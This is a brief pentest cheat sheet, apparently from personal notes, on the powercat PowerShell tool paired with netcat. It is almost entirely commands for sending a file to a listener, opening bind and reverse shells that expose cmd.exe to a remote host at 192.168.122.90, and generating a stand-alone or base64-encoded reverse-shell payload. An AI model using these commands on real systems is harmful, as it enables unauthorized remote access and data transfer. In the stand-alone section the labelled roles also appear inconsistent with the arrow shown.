---
title: "powercat"
linkTitle: "powercat"
date: 2017-01-05
---

### File transfert

`Alice -> Bob`

1. Alice

    ```bash
    nc -lnvp 1234 > receiving_powercat.ps1
    ```

2. Bob

    ```powershell
    powercat -c 192.168.122.90 -p 1234 -i C:\Users\aaa\Desktop\powercat.ps1
    ```

### Bind shell

`Alice -> Bob`

1. Bob

    ```powershell
    powercat -l -p 1234 -e cmd.exe
    ```

2. Alice

    ```bash
    nc 192.168.122.90 1234
    ```

### Reverse shell

`Alice <- Bob`

1. Alice

    ```bash
    nc -lnvp 1234
    ```

2. Bob

    ```bash
    powercat -c 192.168.122.90 -p 1234 -e cmd.exe
    ```

### Stand-alone payload

Reverse shell with a stand-alone payload.

`Alice <- Bob`

1. Alice: Generate payload with `-g` or `-ge` for base64 encoded payload.

    ```powershell
    powercat -c 192.168.122.90 -p 1234 -e cmd.exe -g > reversershell.ps1

    ./reversershell.ps1
    ```

    If `-ge` is used, the payload has to be run with `-E` flag `powershell -E ${base64}`

    ```powershell
    powershell.exe -E
    ```

2. Bob

    ```bash
    nc -lnvp 1234
    ```
